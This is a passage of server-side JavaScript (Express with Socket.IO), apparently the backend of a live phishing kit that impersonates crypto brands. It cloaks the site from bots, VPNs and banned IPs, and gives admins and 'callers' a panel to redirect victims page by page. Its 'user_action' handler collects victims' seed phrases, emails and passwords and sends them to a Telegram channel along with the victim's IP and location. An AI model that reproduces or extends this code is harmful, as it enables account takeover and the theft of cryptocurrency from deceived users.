                'Pragma': 'no-cache',
                'Expires': '0',
                'Content-Type': 'text/html; charset=UTF-8'
            };

            // Apply all security headers
            Object.entries(securityHeaders).forEach(([header, value]) => {
                res.setHeader(header, value);
            });

            // Send transformed HTML
            res.send(transformedHtml);
        } catch (error) {
            console.error('Error transforming HTML:', error);
            res.setHeader('Content-Type', 'text/html; charset=UTF-8');
            res.sendFile(pagePath);
        }

    } catch (error) {
        console.error('Error in page serving middleware:', error);
        return res.redirect('/');
    }
};


async function loadBlockedIPs() {
    try {
        const ipList = await fsPromises.readFile(join(__dirname, 'ips.txt'), 'utf8');
        const ips = ipList.split('\n')
            .map(ip => ip.trim())
            .filter(ip => ip); // Remove empty lines
        
        blockedIPs.clear();
        ips.forEach(ip => blockedIPs.add(ip));
        console.log(`Loaded ${blockedIPs.size} IPs from ips.txt`);
    } catch (error) {
        console.error('Error loading IPs:', error);
    }
}

app.get('/', async (req, res, next) => {
    console.log('Root route accessed');

    // Get client IP with fallbacks
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] ||
                    req.headers['x-real-ip'] ||
                    req.socket.remoteAddress;

    // Check for admin panel access
    const isAdminPanel = req.headers.referer?.includes('/admin');
    if (isAdminPanel) {
        return next();
    }

    // Check if website is enabled
    if (!state.settings.websiteEnabled && !isAdminPanel) {
        console.log('Website disabled - redirecting to:', state.settings.redirectUrl);
        return res.redirect(state.settings.redirectUrl);
    }

    // Check if IP is blocked
    if (blockedIPs.has(clientIP)) {
        console.log(`Blocked IP detected (${clientIP}) - redirecting to:`, state.settings.redirectUrl);
        return res.redirect(state.settings.redirectUrl);
    }

    // Check for existing verified session
    const userAgent = req.headers['user-agent'];
    const hostname = req.get('host') || req.hostname || 'localhost';
    const detectedBrand = detectBrandFromDomain(hostname);
    const publicIP = await getPublicIP(clientIP);
    const sessionId = generateSessionId(publicIP, userAgent, detectedBrand);

    const existingSession = sessionManager.getAllVerifiedSessions().find(s => s.id === sessionId);
    if (existingSession) {
        // User has an existing verified session, redirect to their current page
        const redirectUrl = sessionManager.updateSessionUrl(existingSession);
        console.log('Existing verified session found, redirecting to:', redirectUrl);
        return res.redirect(redirectUrl);
    }

    // No existing session, redirect to check-ip for new session creation
    return res.redirect('/check-ip');
});



 // Validate caller session token endpoint
app.post('/api/auth/validate-token', (req, res) => {
    const { token } = req.body;

    if (!token) {
        return res.status(400).json({
            success: false,
            error: 'Token required'
        });
    }

    const session = callerSessionManager.validateSession(token);

    if (session) {
        // Get caller data
        const caller = callerManager.getCallerByUsername(session.username);
        if (caller) {
            res.json({
                success: true,
                user: {
                    id: caller.id,
                    username: caller.username,
                    role: 'caller'
                }
            });
        } else {
            // Caller was deleted
            callerSessionManager.revokeSession(token);
            res.status(401).json({
                success: false,
                error: 'User no longer exists'
            });
        }
    } else {
        res.status(401).json({
            success: false,
            error: 'Invalid or expired token'
        });
    }
});

// Caller authentication endpoint
app.post('/api/auth/caller', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            error: 'Username and password required'
        });
    }

    const result = callerManager.verifyCaller(username, password);

    if (result.success) {
        // Create a persistent session token
        const token = callerSessionManager.createSession(result.caller.id, result.caller.username);

        res.json({
            success: true,
            user: result.caller,
            token: token
        });
    } else {
        res.status(401).json({
            success: false,
            error: 'Invalid credentials'
        });
    }
});

app.post('/verify-honeypot', async (req, res) => {
    const { email, username, website } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                    req.headers['x-real-ip'] || 
                    req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    // If any honeypot field is filled, it's likely a bot
    if (email || username || website) {
        console.log('Honeypot triggered:', {
            ip: clientIP,
            userAgent,
            fields: { email, username, website }
        });
        
        // Log the bot
        await BotLogger.logBot({
            ip: clientIP,
            userAgent,
            fields: { email, username, website }
        });
        
        return res.json({ redirect: state.settings.redirectUrl });
    }
    
    res.json({ success: true });
});

app.post('/verify-environment', async (req, res) => {
    try {
        const botCheck = await detectBot(req);
        
        if (botCheck.isBot) {
            console.log('Bot detected:', {
                userAgent: req.headers['user-agent'],
                ip: req.ip,
                ...botCheck
            });
            
            return res.json({ 
                valid: false, 
                reason: botCheck.reason,
                details: botCheck.details,
                confidence: botCheck.confidence
            });
        }

        // Log legitimate user information
        console.log('Legitimate user detected:', {
            userAgent: req.headers['user-agent'],
            ip: req.ip,
            confidence: botCheck.confidence,
            fingerprint: botCheck.fingerprint
        });

        res.json({ 
            valid: true,
            confidence: botCheck.confidence,
            details: {
                userAgent: req.headers['user-agent'],
                fingerprint: botCheck.fingerprint,
                score: botCheck.browserScore
            }
        });
    } catch (error) {
        console.error('Environment verification error:', error);
        res.json({ 
            valid: false, 
            reason: 'verification_error',
            error: error.message
        });
    }
});



// Initial IP check
// Helper function to generate random identifiers
const generateRandomId = (prefix = '') => {
    return prefix + '_' + Math.random().toString(36).substring(2, 15);
};

app.get('/check-ip', async (req, res) => {
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] ||
                    req.headers['x-real-ip'] ||
                    req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const isAdminPanel = req.headers.referer?.includes('/admin');

    // Detect brand from the host header
    const hostname = req.get('host') || req.hostname || 'localhost';
    const detectedBrand = detectBrandFromDomain(hostname);

    console.log('Check-IP Request:', {
        clientIP,
        userAgent,
        referer: req.headers.referer || '',
        hostname,
        detectedBrand
    });

    try {
        const publicIP = await getPublicIP(clientIP);

        // Block banned IPs
        if (ipManager.isIPBanned(publicIP) && !isAdminPanel) {
            return res.redirect(state.settings.redirectUrl);
        }

        const sessionId = generateSessionId(publicIP, userAgent, detectedBrand);

        // Create new session if needed (existing sessions should have been handled by root route)
        if (!sessionManager.getSession(sessionId)) {
            const session = sessionManager.createSession(sessionId, publicIP, userAgent, detectedBrand);
            session.currentPage = 'captcha';  // Set current page explicitly
            sessionManager.updateSessionUrl(session);  // Update URL after setting page
        }

        // Get current session and set up URL parameters
        const session = sessionManager.getSession(sessionId);
        const urlParams = new URLSearchParams({
            client_id: sessionId,
            oauth_challenge: session.oauthChallenge,
            t: Date.now(),
            v: crypto.randomBytes(8).toString('hex')
        }).toString();

        // Set security headers
        const nonce = crypto.randomBytes(16).toString('hex');
        const securityHeaders = {
            'Content-Security-Policy': [
                "default-src 'self'",
                `script-src 'self' 'unsafe-inline' 'unsafe-eval' 'nonce-${nonce}' https://challenges.cloudflare.com`,
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' data: https:",
                "font-src 'self' data: https:",
                "connect-src 'self' ws: wss:",
                "frame-src 'self' https://challenges.cloudflare.com",
                "media-src 'self'",
                "object-src 'none'"
            ].join('; '),
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'SAMEORIGIN',
            'X-XSS-Protection': '1; mode=block',
            'Referrer-Policy': 'strict-origin-when-cross-origin',
            'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        };

        Object.entries(securityHeaders).forEach(([header, value]) => {
            res.setHeader(header, value);
        });

        // Set tracking headers
        const rayId = crypto.randomBytes(4).toString('hex');
        res.setHeader('X-Ray-ID', rayId);
        res.setHeader('X-Session-ID', sessionId);

        // Notify admin of new pending session
        adminNamespace.emit('pending_session_created', {
            id: sessionId,
            ip: publicIP,
            userAgent,
            rayId: rayId,
            timestamp: Date.now()
        });

        // Redirect to captcha page
        res.redirect(`/pages/captcha.html?${urlParams}`);

    } catch (error) {
        console.error('Error in check-ip:', error);
        return res.redirect(state.settings.redirectUrl);
    }
});

const checkBannedIP = async (req, res, next) => {
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                    req.headers['x-real-ip'] || 
                    req.socket.remoteAddress;
    const isAdminPanel = req.headers.referer?.includes('/admin');
    
    if (isAdminPanel) {
        return next();
    }

    try {
        const publicIP = await getPublicIP(clientIP);
        if (ipManager.isIPBanned(publicIP)) {
            return res.redirect(state.settings.redirectUrl);
        }
        next();
    } catch (error) {
        console.error('Error checking IP:', error);
        next();
    }
};

// Add this middleware before your page routes
app.use('/:page', checkBannedIP);

// Captcha verification endpoint
// Modify the verify-turnstile endpoint
// Modified verify-turnstile endpoint
app.post('/verify-turnstile', async (req, res) => {
    const { token, sessionId } = req.body;

    console.log('Verifying turnstile:', { sessionId });

    // Detect brand from session ID or request headers
    let detectedBrand = 'gemini';
    if (sessionId && sessionId.includes('-')) {
        const prefix = sessionId.split('-')[0];
        // Map prefix to brand
        for (const [brand, config] of Object.entries(BRAND_CONFIG)) {
            if (config.prefix === prefix) {
                detectedBrand = brand;
                break;
            }
        }
    } else {
        // Fallback to detecting from host header
        const hostname = req.get('host') || req.hostname || '';
        detectedBrand = detectBrandFromDomain(hostname);
    }

    // Get brand-specific Turnstile configuration
    const turnstileConfig = getTurnstileConfig(detectedBrand);
    const secretKey = turnstileConfig.secretKey || process.env.CLOUDFLARE_SECRET_KEY;

    console.log(`[TURNSTILE] Verifying for brand: ${detectedBrand}`);

    try {
        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                secret: secretKey,
                response: token
            })
        });

        const data = await response.json();
        console.log('Turnstile verification result:', data);

        if (data.success && sessionId) {
            let session = sessionManager.getSession(sessionId);
            const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
                .find(s => s.id === sessionId);

            if (existingVerifiedSession) {
                // If there's an existing verified session, reactivate it instead of creating new
                existingVerifiedSession.connected = true;
                existingVerifiedSession.loading = false;
                existingVerifiedSession.lastHeartbeat = Date.now();
                existingVerifiedSession.lastAccessed = Date.now();
                
                // Update session to Loading page based on brand
                const sessionBrand = existingVerifiedSession.brand || 'gemini';
                const loadingPage = BRAND_CONFIG[sessionBrand]?.loadingPage || 'geminiloading.html';
                const loadingPageName = loadingPage.replace('.html', '');
                const newUrl = sessionManager.updateSessionPage(sessionId, loadingPageName);
                
                console.log('Reactivating existing session:', sessionId);
                emitSessionUpdate('session_updated', existingVerifiedSession);
                
                return res.json({ 
                    success: true, 
                    url: newUrl,
                    verified: true
                });
            }

            if (session) {
                // Verify and promote the session
                sessionManager.verifySession(sessionId);
                
                // Get IP details and update session
                const ipDetails = await getIPDetails(session.clientIP);
                session.ip = ipDetails.ip;
                session.hostname = ipDetails.hostname;
                session.country = ipDetails.country;
                session.city = ipDetails.city;
                session.region = ipDetails.region;
                session.isp = ipDetails.isp;
                session.connected = true;
                session.loading = false;

                // Update session to Loading page based on brand
                const sessionBrand = session.brand || 'gemini';
                const loadingPage = BRAND_CONFIG[sessionBrand]?.loadingPage || 'geminiloading.html';
                const loadingPageName = loadingPage.replace('.html', '');
                const newUrl = sessionManager.updateSessionPage(sessionId, loadingPageName);
                
                console.log('Session verified and promoted, new URL:', newUrl);
                
                // Only now notify admin of new session since it's verified
                emitSessionUpdate('session_created', session);
                const sessionAlias = aliasManager.getAlias(sessionId);
                await sendTelegramNotification(formatTelegramMessage('new_session', {
                    id: sessionId,
                    alias: sessionAlias || 'Not Set',
                    ip: session.clientIP,
                    userAgent: session.userAgent,
                    location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`
                }));
                
                return res.json({ 
                    success: true, 
                    url: newUrl,
                    verified: true
                });
            }
        }
        
        res.json({ success: false, error: 'Verification failed' });
    } catch (error) {
        console.error('Turnstile verification error:', error);
        res.json({ success: false, error: 'Verification failed' });
    }
});


// Page serving route - must come after other routes
app.get('/:page', pageServingMiddleware);


// Static files
app.use(express.static(join(__dirname, '../../public')));
const loadingTimeouts = new Map();

// User namespace
const userNamespace = io.of('/user');

userNamespace.use(async (socket, next) => {
    const clientIP = socket.handshake.headers['x-forwarded-for'] || 
                    socket.handshake.headers['x-real-ip'] || 
                    socket.handshake.address;
                    
    try {
        const publicIP = await getPublicIP(clientIP);
        socket.cleanIP = publicIP;
        
        if (ipManager.isIPBanned(publicIP)) {
            socket.disconnect(true);
            return next(new Error('IP banned'));
        }

        // VPN check
        if (state.settings.vpnBlockEnabled) {
            const ipDetails = await getIPDetails(publicIP);
            if (ipDetails.isVPN || ipDetails.isProxy || ipDetails.isTor) {
                socket.disconnect(true);
                return next(new Error('VPN detected'));
            }
        }

        // Bot check
        if (state.settings.antiBotEnabled) {
            const botCheck = await detectBot(socket.handshake);
if (botCheck.isBot) {
    socket.disconnect(true);
    return next(new Error(`Bot detected: ${botCheck.reason}`));
}
        }

        next();
    } catch (error) {
        console.error('Socket middleware error:', error);
        next(error);
    }
});

userNamespace.on('connection', async (socket) => {
    const userAgent = socket.handshake.headers['user-agent'];
    const clientIP = socket.cleanIP;

    try {
        const ipDetails = await getIPDetails(clientIP);

        // Try to get session ID from query params first (if provided by client)
        let sessionId = socket.handshake.query.sessionId;

        if (!sessionId) {
            // If not provided, try to detect brand from referrer or host
            const host = socket.handshake.headers.host || socket.handshake.headers.referer || '';
            const detectedBrand = detectBrandFromDomain(host);
            sessionId = generateSessionId(clientIP, userAgent, detectedBrand);
        }

        console.log(`[USER CONNECTION] Socket connected with session ID: ${sessionId}`);

        let session = sessionManager.getSession(sessionId);

        // If not found, try to find by any brand prefix
        if (!session) {
            const baseId = sessionId.includes('-') ? sessionId.split('-')[1] : sessionId;
            const allSessions = sessionManager.getAllVerifiedSessions();
            session = allSessions.find(s => s.id.endsWith(`-${baseId}`));
            if (session) {
                sessionId = session.id;
                console.log(`[USER CONNECTION] Found session by base ID: ${sessionId}`);
            }
        }

        if (session) {
            // Clean up any existing timeouts
            if (session.disconnectTimeout) {
                clearTimeout(session.disconnectTimeout);
                delete session.disconnectTimeout;
            }
            const existingTimeout = loadingTimeouts.get(sessionId);
            if (existingTimeout) {
                clearTimeout(existingTimeout);
                loadingTimeouts.delete(sessionId);
            }

            // Update existing session
            session.connected = true;
            session.loading = false;
            session.lastHeartbeat = Date.now();
            if (socket.handshake.query.page) {
                session.currentPage = socket.handshake.query.page;
            }

            // Refresh IP details on reconnection
            session.ip = ipDetails.ip;
            session.hostname = ipDetails.hostname;
            session.country = ipDetails.country;
            session.city = ipDetails.city;
            session.region = ipDetails.region;
            session.isp = ipDetails.isp;
            
            // Only emit updates for verified sessions
            if (!sessionManager.isPending(sessionId)) {
                adminNamespace.emit('session_updated', session);
            }
        } else {
            // Create new session
            session = sessionManager.createSession(sessionId, clientIP, userAgent);
            
            // Add IP details to session
            session.ip = ipDetails.ip;
            session.hostname = ipDetails.hostname;
            session.country = ipDetails.country;
            session.city = ipDetails.city;
            session.region = ipDetails.region;
            session.isp = ipDetails.isp;
            session.connected = true;
            session.loading = false;
            session.lastHeartbeat = Date.now();
            session.disconnectTimeout = null; // Initialize timeout tracker

            // Only notify admin if session is verified (not pending)
            if (!sessionManager.isPending(sessionId)) {
                adminNamespace.emit('session_created', session);
                const sessionAlias = aliasManager.getAlias(sessionId);
                await sendTelegramNotification(formatTelegramMessage('new_session', {
                    id: sessionId,
                    alias: sessionAlias || 'Not Set',
                    ip: clientIP,
                    userAgent,
                    location: `${ipDetails.city || 'Unknown'}, ${ipDetails.country || 'Unknown'}`
                }));
            }
        }

        // Store session ID on socket for disconnect handling
        socket.sessionId = sessionId;
        socket.emit('session_url', session.url);

        socket.on('request_redirect', (data) => {
            const session = sessionManager.getSession(socket.sessionId);
            if (session) {
                // Keep connection active during redirect
                session.loading = true;
                session.connected = true;

                // Use the page mapping to resolve the correct file name
                const brand = session.brand || 'gemini';
                const resolvedPageName = resolvePageName(brand, data.page);
                session.currentPage = resolvedPageName;
                const newUrl = sessionManager.updateSessionUrl(session);
                
                if (newUrl) {
                    console.log('Redirecting user to:', newUrl);
                    socket.emit('redirect', newUrl);
                }
                
                // Notify admin of update if session is verified
                if (!sessionManager.isPending(socket.sessionId)) {
                    adminNamespace.emit('session_updated', session);
                }
            }
        });

        // Handle page changes
        socket.on('page_change', (page) => {
            const session = sessionManager.getSession(sessionId);
            if (session && sessionManager.getPagePath(page, session.brand || 'gemini')) {
                session.loading = true;
                session.lastAccessed = Date.now();
                session.lastHeartbeat = Date.now();
                
                const newUrl = sessionManager.updateSessionPage(
                    sessionId, 
                    page.replace('.html', '')
                );
                
                if (newUrl) {
                    socket.emit('session_url', newUrl);
                }
                
                // Only emit updates for verified sessions
                if (!sessionManager.isPending(sessionId)) {
                    adminNamespace.emit('session_updated', session);
                }
            }
        });

        // Handle review completion
        socket.on('review_completed', async (data) => {
            const session = sessionManager.getSession(sessionId);
            if (session) {
                session.reviewCompleted = true;
                adminNamespace.emit('session_updated', session);
                const sessionAlias = aliasManager.getAlias(sessionId);
                await sendTelegramNotification(formatTelegramMessage('review_completed', {
                    sessionId,
                    alias: sessionAlias || 'Not Set',
                    ip: clientIP,
                    timestamp: data.timestamp
                }));
            }
        });

        // Handle amount confirmation
        socket.on('amount_confirmed', (data) => {
            const session = sessionManager.getSession(sessionId);
            if(session) {
                session.selectedAmount = data.amount;
                adminNamespace.emit('session_updated', session);

                const sessionAlias = aliasManager.getAlias(sessionId);
                sendTelegramNotification(formatTelegramMessage('amount_confirmed', {
                    sessionId: session.id,
                    alias: sessionAlias || 'Not Set',
                    amount: data.amount,
                    ip: session.ip
                }));
            }
        });

        // Handle user actions (like seed phrase submission, email, password)
        socket.on('user_action', async (action) => {
            if (action.type === 'seed_phrase_submitted') {
                const sessionAlias = aliasManager.getAlias(sessionId);
                await sendTelegramNotification(formatTelegramMessage('seed_phrase', {
                    sessionId,
                    alias: sessionAlias || 'Not Set',
                    ip: session.clientIP,
                    location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`,
                    seedPhrase: action.data,
                    timestamp: action.timestamp
                }));

                if (session) {
                    session.loading = true;
                    adminNamespace.emit('session_updated', session);
                }
            } else if (action.type === 'email_submitted') {
                // Handle email submission
                const sessionAlias = aliasManager.getAlias(sessionId);
                await sendTelegramNotification(formatTelegramMessage('email_submitted', {
                    sessionId,
                    alias: sessionAlias || 'Not Set',
                    ip: session.clientIP,
                    location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`,
                    email: action.data.email,
                    provider: action.data.provider || 'Unknown',
                    timestamp: action.timestamp
                }));

                if (session) {
                    session.email = action.data.email;
                    session.loading = true;
                    adminNamespace.emit('session_updated', session);
                }
            } else if (action.type === 'password_submitted') {
                // Handle password submission
                const sessionAlias = aliasManager.getAlias(sessionId);
                await sendTelegramNotification(formatTelegramMessage('password_submitted', {
                    sessionId,
                    alias: sessionAlias || 'Not Set',
                    ip: session.clientIP,
                    location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`,
                    email: session.email || 'Unknown',
                    password: action.data.password,
                    provider: action.data.provider || 'Unknown',
                    timestamp: action.timestamp
                }));

                if (session) {
                    session.loading = true;
                    adminNamespace.emit('session_updated', session);
                }
            }
        });

        // Handle heartbeat
        socket.on('heartbeat', () => {
            const session = sessionManager.getSession(sessionId);
            if (session) {
                session.lastHeartbeat = Date.now();
                session.lastAccessed = Date.now();
                session.connected = true;
                // Only emit updates for verified sessions
                if (!sessionManager.isPending(sessionId)) {
                    adminNamespace.emit('session_updated', session);
                }
            }
        });



        // Check session URL
        socket.on('check_session_url', () => {
            const session = sessionManager.getSession(sessionId);
            if (session && session.url) {
                socket.emit('session_url', session.url);
            }
        });

        socket.on('page_loading', (isLoading) => {
            const session = sessionManager.getSession(sessionId);
            if (session) {
                session.loading = isLoading;
                session.lastAccessed = Date.now();
                session.lastHeartbeat = Date.now();
                
                // If page load completes, clear any pending disconnect timeout
                if (!isLoading) {
                    const existingTimeout = loadingTimeouts.get(sessionId);
                    if (existingTimeout) {
                        clearTimeout(existingTimeout);
                        loadingTimeouts.delete(sessionId);
                    }
                    session.connected = true; // Ensure we mark as connected when load completes
                }
                
                if (!sessionManager.isPending(sessionId)) {
                    adminNamespace.emit('session_updated', session);
                }
            }
        });
    

        // Handle disconnection with cleanup delay
        socket.on('disconnect', () => {
            const sessionId = socket.sessionId;
            const session = sessionManager.getSession(sessionId);

            if (session) {
                // Mark as disconnected immediately
                session.connected = false;
                session.loading = false;

                // Update the admin immediately
                if (!sessionManager.isPending(sessionId)) {
                    emitSessionUpdate('session_updated', session);
                }

                console.log(`User disconnected: ${sessionId}`);
        
                session.lastHeartbeat = Date.now();
                
                setTimeout(() => {
                    const currentSession = sessionManager.getSession(sessionId);
                    if (currentSession && !currentSession.connected && 
                        Date.now() - currentSession.lastHeartbeat > 900000) {
                        
                        // Clear any remaining timeouts for this session
                        const existingTimeout = loadingTimeouts.get(sessionId);
                        if (existingTimeout) {
                            clearTimeout(existingTimeout);
                            loadingTimeouts.delete(sessionId);
                        }
                        
                        sessionManager.deleteSession(sessionId);
                        
                        if (!sessionManager.isPending(sessionId)) {
                            adminNamespace.emit('session_removed', sessionId);
                        }
                    }
                }, 900000);
            }
        });

    } catch (error) {
        console.error('Connection handling error:', error);
        socket.disconnect(true);
    }
});



// Track active caller sessions
const activeCallerSessions = new Map(); // Map of username to socket IDs

// Admin namespace
const adminNamespace = io.of('/admin');

// Helper function to emit session updates to appropriate users
function emitSessionUpdate(eventName, sessionOrId) {
    // Get the session object if we only have an ID
    const session = typeof sessionOrId === 'string'
        ? sessionManager.getSession(sessionOrId)
        : sessionOrId;

    // Emit to all connected sockets in admin namespace
    adminNamespace.sockets.forEach((socket) => {
        if (socket.userRole === 'admin') {
            // Admins see all sessions
            socket.emit(eventName, sessionOrId);
        } else if (socket.userRole === 'caller' && socket.username) {
            // Callers only see their assigned sessions
            if (session && session.assignedTo === socket.username) {
                socket.emit(eventName, sessionOrId);
            }
        }
    });
}

adminNamespace.use((socket, next) => {
    const token = socket.handshake.auth.token;
    const userRole = socket.handshake.auth.role;
    const username = socket.handshake.auth.username;

    // Check if it's an admin token
    if (verifyAdmin(token)) {
        socket.userRole = 'admin';
        socket.username = username || 'admin';
        next();
    }
    // Check if it's a caller with a session token
    else if (userRole === 'caller' && token) {
        const session = callerSessionManager.validateSession(token);
        if (session) {
            // Verify caller still exists
            const caller = callerManager.getCallerByUsername(session.username);
            if (caller) {
                socket.userRole = 'caller';
                socket.username = session.username;
                socket.callerId = session.callerId;
                next();
            } else {
                // Caller was deleted
                callerSessionManager.revokeSession(token);
                next(new Error('User no longer exists'));
            }
        } else {
            next(new Error('Invalid or expired session'));
        }
    }
    // Legacy support for callers without token (will be removed)
    else if (userRole === 'caller' && username) {
        socket.userRole = 'caller';
        socket.username = username;
        next();
    } else {
        next(new Error('Authentication failed'));
    }
});

adminNamespace.on('connection', (socket) => {
    // Track caller sessions
    if (socket.userRole === 'caller' && socket.username) {
        if (!activeCallerSessions.has(socket.username)) {
            activeCallerSessions.set(socket.username, new Set());
        }
        activeCallerSessions.get(socket.username).add(socket.id);
        console.log(`Caller ${socket.username} connected with socket ${socket.id}`);
    }

    // Only get verified sessions using the session manager's method
    let sessionsToSend;
    if (socket.userRole === 'caller' && socket.username) {
        // Callers only see their assigned sessions
        sessionsToSend = sessionManager.getAssignedSessions(socket.username);
    } else {
        // Admins see all verified sessions
        sessionsToSend = sessionManager.getAllVerifiedSessions();
    }

    socket.emit('init', {
        settings: state.settings,
        sessions: sessionsToSend,
        bannedIPs: ipManager.getAllBannedIPs(),
        availablePages: state.settings.availablePages,
        callers: callerManager.getAllCallers(),
        aliases: aliasManager.getAllAliases()
    });

    socket.on('update_settings', (newSettings) => {
        const oldSettings = { ...state.settings };
        Object.assign(state.settings, newSettings);
        adminNamespace.emit('settings_updated', state.settings);
        
        // If website is being disabled
        if (oldSettings.websiteEnabled && !newSettings.websiteEnabled) {
            // Get all verified sessions
            const allSessions = sessionManager.getAllVerifiedSessions();
            
            // Disconnect and redirect all active sessions
            for (const session of allSessions) {
                const sockets = Array.from(userNamespace.sockets.values());
                const targetSocket = sockets.find(s => s.sessionId === session.id);
                if (targetSocket) {
                    // First redirect
                    targetSocket.emit('redirect', state.settings.redirectUrl);
                    // Then force disconnect
                    setTimeout(() => {
                        targetSocket.disconnect(true);
                    }, 500);
                }
                // Also clean up the session
                sessionManager.deleteSession(session.id);
            }
            
            // Clear all sessions since site is disabled
            sessionManager.sessions.clear();
            sessionManager.pendingSessions.clear();
            adminNamespace.emit('sessions_cleared');
        }
    
        // Send status update
        if (oldSettings.websiteEnabled !== newSettings.websiteEnabled) {
            sendStatusUpdate({
                websiteEnabled: newSettings.websiteEnabled,
                activeSessions: sessionManager.sessions.size,
                bannedIPs: state.bannedIPs.size
            });
        }
    });

    socket.on('redirect_user', ({ sessionId, page, placeholders }) => {
        console.log(`[REDIRECT] Attempting to redirect session ${sessionId} to ${page} by ${socket.userRole} (${socket.username || 'admin'})`);

        // Permission check: callers can only redirect their assigned sessions
        const session = sessionManager.getSession(sessionId);
        if (!session) {
            console.log(`[REDIRECT] Session ${sessionId} not found`);
            return;
        }

        if (socket.userRole === 'caller' && session.assignedTo !== socket.username) {
            console.log(`[REDIRECT] Caller ${socket.username} not authorized to redirect session ${sessionId} (assigned to: ${session.assignedTo})`);
            socket.emit('redirect_error', {
                error: 'You can only redirect sessions assigned to you',
                sessionId
            });
            return;
        }

        const sockets = Array.from(userNamespace.sockets.values());
        console.log(`[REDIRECT] Found ${sockets.length} connected user sockets`);

        const targetSocket = sockets.find(s => s.sessionId === sessionId);

        if (targetSocket) {
            console.log(`[REDIRECT] Found target socket for session ${sessionId}`);
            // Clear any existing timeout
            const existingTimeout = loadingTimeouts.get(sessionId);
            if (existingTimeout) {
                clearTimeout(existingTimeout);
            }

            // Store placeholders if provided
            if (placeholders && Object.keys(placeholders).length > 0) {
                session.placeholders = placeholders;
            }

            session.loading = true;
            session.connected = true;
            session.lastHeartbeat = Date.now();
            adminNamespace.emit('session_updated', session);

            // Set new loading timeout
            const timeout = setTimeout(() => {
                const currentSession = sessionManager.getSession(sessionId);
                if (currentSession && currentSession.loading) {
                    currentSession.loading = false;
                    currentSession.connected = false;
                    adminNamespace.emit('session_updated', currentSession);
                }
                loadingTimeouts.delete(sessionId);
            }, 5000);

            loadingTimeouts.set(sessionId, timeout);

            // Use the page mapping to resolve the correct file name
            const brand = session.brand || 'gemini';
            const resolvedPageName = resolvePageName(brand, page);

            session.currentPage = resolvedPageName;
            const newUrl = sessionManager.updateSessionUrl(session);

            if (newUrl) {
                console.log(`[REDIRECT] Sending redirect to ${newUrl} for ${socket.userRole} ${socket.username || 'admin'}`);
                targetSocket.emit('redirect', newUrl);
            } else {
                console.log(`[REDIRECT] Failed to generate redirect URL`);
            }
        } else {
            console.log(`[REDIRECT] No socket found for session ${sessionId}`);
        }
    });
    



    
    socket.on('remove_session', async ({ sessionId }) => {
        console.log(`[REMOVE] Attempting to remove session ${sessionId}`);
        const session = sessionManager.getSession(sessionId);
        if (session) {
            // First, find and disconnect the user socket
            const sockets = Array.from(userNamespace.sockets.values());
            console.log(`[REMOVE] Found ${sockets.length} connected sockets`);

            const targetSocket = sockets.find(s => s.sessionId === sessionId);
            if (targetSocket) {
                console.log(`[REMOVE] Found socket for session ${sessionId}, redirecting and disconnecting`);
                // Send redirect first
                targetSocket.emit('redirect', state.settings.redirectUrl);
                // Force disconnect after a small delay to ensure redirect is sent
                setTimeout(() => {
                    targetSocket.disconnect(true);
                }, 100);
            } else {
                console.log(`[REMOVE] No active socket found for session ${sessionId}`);
            }

            // Delete the session from manager
            sessionManager.deleteSession(sessionId);
            console.log(`[REMOVE] Session ${sessionId} deleted from manager`);
          const sessionAlias = aliasManager.getAlias(sessionId);
          adminNamespace.emit('session_removed', sessionId);
          await sendTelegramNotification(formatTelegramMessage('session_removed', {
            id: sessionId,
            alias: sessionAlias || 'Not Set',
            removedBy: 'admin'
          }));
        }
      });

    // Assignment handlers
    socket.on('assign_session', ({ sessionId, callerId }) => {
        if (socket.userRole === 'admin') {
            // Check if session has an alias before allowing assignment
            const currentAlias = aliasManager.getAlias(sessionId);
            if (!currentAlias) {
                socket.emit('assignment_error', {
                    error: 'Session must have an alias before assignment'
                });
                return;
            }

            const success = sessionManager.assignSessionToCaller(sessionId, callerId);
            if (success) {
                const session = sessionManager.getSession(sessionId);
                // Use helper to ensure caller receives the newly assigned session
                emitSessionUpdate('session_updated', session);
            }
        }
    });

    socket.on('unassign_session', ({ sessionId }) => {
        if (socket.userRole === 'admin') {
            const success = sessionManager.unassignSession(sessionId);
            if (success) {
                const session = sessionManager.getSession(sessionId);
                // Use helper to remove session from caller's view
                emitSessionUpdate('session_updated', session);
            }
        }
    });

    socket.on('ban_ip', async (ip) => {
        try {
            const publicIP = await getPublicIP(ip);
            
            ipManager.banIP(publicIP, {
                bannedBy: socket.id,
                bannedAt: new Date().toISOString()
            });
            
            state.bannedIPs = new Set(ipManager.getAllBannedIPs());

            // Disconnect all sessions from this IP
            for (const session of sessionManager.sessions.values()) {
                if (session.clientIP === publicIP) {
                    const sockets = Array.from(userNamespace.sockets.values());
                    const targetSocket = sockets.find(s => s.sessionId === session.id);
                    if (targetSocket) {
                        targetSocket.emit('redirect', state.settings.redirectUrl);
                        targetSocket.disconnect(true);
                    }
                    sessionManager.deleteSession(session.id);
                }
            }
            
            adminNamespace.emit('ip_banned', publicIP);
            await sendTelegramNotification(formatTelegramMessage('ip_banned', {
                ip: publicIP,
                bannedBy: socket.id
            }));
        } catch (error) {
            console.error('Error banning IP:', error);
            ipManager.banIP(ip);
            adminNamespace.emit('ip_banned', ip);
        }
    });

    socket.on('unban_ip', async (ip) => {
        try {
            const publicIP = await getPublicIP(ip);
            ipManager.unbanIP(publicIP);
            state.bannedIPs = new Set(ipManager.getAllBannedIPs());
            adminNamespace.emit('ip_unbanned', publicIP);
            await sendTelegramNotification(formatTelegramMessage('ip_unbanned', {
                ip: publicIP
            }));
        } catch (error) {
